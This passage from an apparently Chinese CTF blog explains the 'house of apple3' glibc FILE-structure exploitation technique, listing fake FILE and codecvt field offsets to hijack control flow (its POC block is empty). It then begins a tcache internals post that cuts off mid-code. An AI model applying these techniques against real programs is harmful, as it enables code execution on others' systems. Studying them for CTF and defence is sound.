class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__gconv_step_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>house of apple3</code>的利用主要关注三个函数：<code>__libio_codecvt_in</code>、<code>__libio_codecvt_out</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多。</p>
<p><strong>__libio_codecvt_in</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">			    <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  *from_stop = (<span class="type">const</span> <span class="type">char</span> *) from_start_copy;</span><br><span class="line">  *to_stop = (<span class="type">wchar_t</span> *) codecvt-&gt;__cd_in.step_data.__outbuf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __GCONV_OK:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_EMPTY_INPUT:</span><br><span class="line">      result = __codecvt_ok;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> __GCONV_FULL_OUTPUT:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_INCOMPLETE_INPUT:</span><br><span class="line">      result = __codecvt_partial;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = __codecvt_error;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>__libio_codecvt_out</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_out</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">const</span> <span class="title">wchar_t</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">wchar_t</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">const</span> <span class="title">wchar_t</span> **<span class="title">from_stop</span>, <span class="title">char</span> *<span class="title">to_start</span>, <span class="title">char</span> *<span class="title">to_end</span>,</span></span><br><span class="line"><span class="class">		     <span class="title">char</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_out.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_out.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_out.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  *from_stop = (<span class="type">wchar_t</span> *) from_start_copy;</span><br><span class="line">  *to_stop = (<span class="type">char</span> *) codecvt-&gt;__cd_out.step_data.__outbuf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (status)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __GCONV_OK:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_EMPTY_INPUT:</span><br><span class="line">      result = __codecvt_ok;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> __GCONV_FULL_OUTPUT:</span><br><span class="line">    <span class="keyword">case</span> __GCONV_INCOMPLETE_INPUT:</span><br><span class="line">      result = __codecvt_partial;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = __codecvt_error;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>__libio_codecvt_length</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_length (<span class="keyword">struct</span> _IO_codecvt *codecvt, <span class="type">__mbstate_t</span> *statep,</span><br><span class="line">			<span class="type">const</span> <span class="type">char</span> *from_start, <span class="type">const</span> <span class="type">char</span> *from_end,</span><br><span class="line">			<span class="type">size_t</span> max)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *cp = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line">  <span class="type">wchar_t</span> to_buf[max];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_buf;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) &amp;to_buf[max];</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  DL_CALL_FCT (fct,</span><br><span class="line">	       (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;cp,</span><br><span class="line">		(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">		&amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  result = cp - (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow函数控制程序执行流"></a>利用_IO_wfile_underflow函数控制程序执行流</h2><h3 id="相关配置-4"><a href="#相关配置-4" class="headerlink" title="相关配置"></a>相关配置</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可</li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<h3 id="函数调用链-4"><a href="#函数调用链-4" class="headerlink" title="函数调用链"></a>函数调用链</h3><p><code>_IO_wfile_underflow-&gt;__libio_codecvt_in-&gt;DL_CALL_FCT(gs=fp-&gt;_codecvt-&gt;__cd_in.step)-&gt;*(gs -&gt;__fct)(gs)</code>。</p>
<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p>
<p><strong>详细分析</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。因此可以劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
<h3 id="POC-7"><a href="#POC-7" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div>









<h1 id="house-of-obstack"><a href="#house-of-obstack" class="headerlink" title="house of obstack"></a>house of obstack</h1>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache安全机制及赛题详细解析</title>
    <url>/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Tcache简介"><a href="#Tcache简介" class="headerlink" title="Tcache简介"></a>Tcache简介</h1><p><a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c" >glibc 源码网址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>  ptmallloc2在libc2.26中引入了Tcache这种无需对arena上锁就可以使用的小堆块。<strong>tcache是单链表结构</strong>，每条链上最多可以有 <strong>7</strong> 个 chunk，free 的时候当对应的 tcache bin 满了才放入fastbin，unsorted bin，malloc的时候优先去tcache bin找。</p>
<p>其数据结构如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">/* 最大64个bins */</span><br><span class="line">#define TCACHE_MAX_BINS 64  </span><br><span class="line">#define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="line">#define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="line">#define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="line">#define usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="line">/* 每个bins最多缓存7个chunk */</span><br><span class="line">#define TCACHE_FILL_COUNT 7</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">typedef struct tcache_entry &#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"> /*</span><br><span class="line"> *  tcache_entry 用于链接空闲的 chunk 结构体，其中的 next 指针指向下一个大小相同的 chunk。</span><br><span class="line"> *  需要注意的是这里的 next 指向 chunk 的 user_data ，而 fastbin 的 fd 指向 chunk 开头(prev_size)的地址。</span><br><span class="line"> *  而且，tcache_entry 会复用空闲 chunk 的 user_data 部分。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">// tcache_perthread_struct位于堆的开头，大小为0x250。  </span><br><span class="line">typedef struct tcache_perthread_struct &#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];              //用于存放bins中的chunk数量。</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];    //用于存放64个bins地址</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br><span class="line"> /* </span><br><span class="line"> *    每个 thread 都会维护一个 tcache_perthread_struct，一共有 TCACHE_MAX_BINS 个计数器和 TCACHE_MAX_BINS 项 tcache_entry,</span><br><span class="line"> *  ·tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free后）的 chunk。</span><br><span class="line"> *  ·counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</span><br><span class="line"> */</span><br></pre></td></tr></table></figure></div>

<p>  每个线程默认<strong>64</strong>个单链表结构的bins，每个bins最多存放<strong>7</strong>个chunk。chunk在64位机器以16字节递增，从24到1032字节。在32位机器上以8字节递增，从12到512字节。因此tcache只能存放<strong>non-large</strong>的chunk。</p>
<p>图解</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Tcache%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3VXXSF45THTQ63W.jpg"
                      alt="img"
                ></p>
<h1 id="Tcache实现"><a href="#Tcache实现" class="headerlink" title="Tcache实现"></a>Tcache实现</h1><h2 id="Tcache初始化"><a href="#Tcache初始化" class="headerlink" title="Tcache初始化"></a>Tcache初始化</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">tcache_init(void)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  void *victim = 0;</span><br><span class="line">  const size_t bytes = sizeof (tcache_perthread_struct); //大小为0x240</span><br><span class="line"></span><br><span class="line">  if (tcache_shutting_down)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  /* 使用_int_malloc为 tcache_perthread_struct 分配内存 */</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  /* 分配失败则再次尝试分配 */</span><br><span class="line">  if (!victim &amp;&amp; ar_ptr != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  /* __libc_lock_unlock 是一个宏，用于释放一个互斥锁 */</span><br><span class="line">  if (ar_ptr != NULL)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      /* 转换为tcache_perthread_struce结构 */</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      /* 初始为0 */</span><br><span class="line">      memset (tcache, 0, sizeof (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="分配堆块时"><a href="#分配堆块时" class="headerlink" title="分配堆块时"></a>分配堆块时</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* glibc2.26没有对放入的chunk进行严格校验的，也没有把P位置零 */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  /* 放在头部，和插入fastbin的插入形式是一致的 */</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">*    malloc出来的chunk为fast chunk，</span><br><span class="line">*  那么fastbin中相应大小的chunk会被放入tcache相应大小的tcache bins中，</span><br><span class="line">*  直到相应的tcache bins满7个或者相应的fastbins为空。</span><br><span class="line">*  chunk在tcache bin中顺序与fastbin相反</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                 &amp;&amp; (pp = *fb) != NULL)</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">              if (tc_victim != 0)</span><br><span class="line">                &#123;</span><br><span class="line">                  tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">*   malloc出来的chunk是small chunk。和fast chunk类似。</span><br><span class="line">*      但是会对每一个chunk的next_chunk的prev_inuse位设置为1。</span><br><span class="line">*   chunk在tcache bin中顺序与small bin中顺序相同。</span><br><span class="line">*/</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line">          </span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">              if (tc_victim != 0)</span><br><span class="line">                &#123;</span><br><span class="line">                  bck = tc_victim-&gt;bk;</span><br><span class="line">                  /* 设置标志位 */</span><br><span class="line">                  set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                  if (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                  bin-&gt;bk = bck;</span><br><span class="line">                  bck-&gt;fd = bin;</span><br><span class="line">    </span><br><span class="line">                  tcache_put (tc_victim, tc_idx);</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">/*  </span><br><span class="line">*    如果unsorted chunk跟要用户所需要chunk大小一致，那么会优先将该chunk挂入对应的tcache中，并不直接返回</span><br><span class="line">*/</span><br><span class="line">     